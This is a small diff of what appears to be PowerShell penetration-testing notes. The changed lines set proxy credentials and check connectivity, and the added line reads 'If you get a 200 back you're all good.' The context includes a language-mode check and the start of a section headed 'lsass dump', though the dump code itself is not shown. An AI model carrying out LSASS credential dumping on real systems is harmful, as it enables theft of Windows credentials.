@@ -5,11 +5,12 @@ $ExecutionContext.SessionState.LanguageMode
 
 #Set Proxy SEttings Manually in Powershell (enter in Creds)
 
-$Wcl=New-Object System.Net.WebClient
-$Creds=Get-Credential
-$Wcl.Proxy.Credentials=$Creds
-Invoke-WebRequest http://www.google.co.uk
+$Wcl=New-Object System.Net.WebClient   
+$Creds=Get-Credential   
+$Wcl.Proxy.Credentials=$Creds   
+Invoke-WebRequest http://www.google.co.uk   
 
+If you get a 200 back you're all good.
 
 #lsass dump
 $processes = Get-Process
